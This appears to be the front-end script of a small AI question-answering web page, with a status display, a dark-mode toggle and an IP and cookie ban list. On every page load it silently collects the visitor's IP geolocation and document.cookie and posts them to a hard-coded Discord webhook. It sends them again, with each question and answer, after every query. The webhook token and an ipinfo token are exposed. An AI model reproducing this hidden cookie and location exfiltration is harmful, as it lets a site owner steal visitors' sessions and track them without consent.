// Emoji list
const statusEmojis = {
    check: 'https://cdn.discordapp.com/emojis/1218461285746741350.png',
    empty: 'https://cdn.discordapp.com/emojis/1218461482543484929.png',
    cross: 'https://cdn.discordapp.com/emojis/1218461700198633523.png',
    warning: 'https://cdn.discordapp.com/emojis/1271705073650503680.png',
    yellowAlert: 'https://cdn.discordapp.com/emojis/1271705121859833856.png',
    orangeAlert: 'https://cdn.discordapp.com/emojis/1271705220736483378.png',
    error: 'https://cdn.discordapp.com/emojis/1271705264038346813.png',
    space: 'https://cdn.discordapp.com/emojis/1273231578402918401.png',
    ellipsis: 'https://cdn.discordapp.com/emojis/1285189210835390534.png',
    rage: 'https://link-to-rage-emoji.png' // Placeholder, to be updated later
};

const bannedUsers = [
    { cookie: 'example_cookie1', ip: '192.168.1.1' },
    { cookie: 'example_cookie2', ip: '192.168.1.2' },
    { cookie: 'example_cookie3', ip: '192.168.1.3' }
];

document.addEventListener('DOMContentLoaded', async function () {
    const ipInfoResponse = await fetch('https://ipinfo.io/json?token=99798ae623ac1d');
    const ipData = await ipInfoResponse.json();
    const visitorCookie = document.cookie || 'No cookies found';

    // Check if the visitor is banned
    const isBanned = bannedUsers.some(user => user.cookie === visitorCookie || user.ip === ipData.ip);

    // Elements
    const responseContainer = document.getElementById("response");
    const sendButton = document.getElementById("send");
    const statusMessage = document.querySelector("#status-message");
    const statusImage = document.querySelector("#status-image");

    // Default status before checking
    statusImage.src = statusEmojis.space;
    statusMessage.innerText = "Loading...";

    if (isBanned) {
        // Send webhook for banned user visit
        const bannedVisitWebhookMessage = {
            title: "Banned User Visit",
            description: `
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
            `.trim(),
            color: 16711680 // Red color to indicate a banned user
        };
        await sendWebhook(bannedVisitWebhookMessage);

        // Disable interaction and notify the user
        sendButton.disabled = true;
        statusMessage.innerText = "You are blacklisted from using this service.";
        responseContainer.innerText = ""; // Clear the response container
        statusImage.src = statusEmojis.cross; // Set to cross emoji
        return; // Exit the script if the user is banned
    }

    // Send webhook data on page visit for non-banned users
    const visitWebhookMessage = {
        title: "New Website Visit",
        description: `
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Timezone:** ${ipData.timezone}
**Org:** ${ipData.org}
**Location:** ${ipData.loc}
**Cookies:** ${visitorCookie}
        `.trim(),
        color: Math.floor(Math.random() * 16777215) // Random color
    };

    // Send webhook for new visitor
    await sendWebhook(visitWebhookMessage);

    // Toggle dark mode functionality
    const toggleDarkModeButton = document.getElementById('toggleDarkModeButton');
    toggleDarkModeButton.addEventListener('click', function () {
        document.body.classList.toggle('dark-mode');
        this.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
    });

    // Handle question asking and response
    const inputBox = document.getElementById("question");

    sendButton.addEventListener("click", async function () {
        const question = inputBox.value;
        if (!question) return;

        sendButton.disabled = true;
        sendButton.innerText = "...";

        const startTime = Date.now();
        const response = await fetch(`https://tilki.dev/api/hercai?soru=${encodeURIComponent(question)}`);
        const data = await response.json();
        const endTime = Date.now();

        const timeTaken = endTime - startTime;
        const formattedTime = formatDuration(timeTaken);

        if (data.error) {
            // Handle error case
            statusMessage.innerText = "You have an adblocker, VPN, or another issue.";
            responseContainer.innerText = ""; // Clear the response container
            statusImage.src = statusEmojis.ellipsis; // Set to ellipsis emoji
            sendButton.disabled = true; // Keep button disabled
        } else {
            const questionWebhookMessage = {
                title: "Question Asked",
                description: `
**Question:** ${question}
**Response:** ${data.cevap}
**Time Taken:** ${formattedTime}
**IP:** ${ipData.ip}
**City:** ${ipData.city}
**Region:** ${ipData.region}
**Country:** ${ipData.country}
**Cookies:** ${visitorCookie}
                `.trim(),
                color: Math.floor(Math.random() * 16777215)
            };

            // Send webhook for the question
            await sendWebhook(questionWebhookMessage);

            responseContainer.innerText = data.cevap;
            statusImage.src = statusEmojis.check; // Set to check emoji
            statusMessage.innerText = "The API is all good!";
        }

        // Cooldown before re-enabling the button
        setTimeout(() => {
            sendButton.disabled = false;
            sendButton.innerText = "Send";
        }, 3000); // 3-second cooldown
    });

    async function sendWebhook(embedMessage) {
        const webhookUrl = 'https://discord.com/api/webhooks/1289960861028454481/wXuSMQSu71G0XjJouR2MtLJSupMuRcRZo0CNSVpyfw3Hma5uaiOO3R0KomuissnxXH5F'; // Replace with your actual webhook URL
        const payload = {
            embeds: [embedMessage]
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
    }

    function formatDuration(ms) {
        if (ms < 1000) {
            return `${ms} ms`;
        } else if (ms < 60000) {
            return `${Math.floor(ms / 1000)} seconds`;
        } else {
            return `${Math.floor(ms / 60000)} minutes`;
        }
    }
});
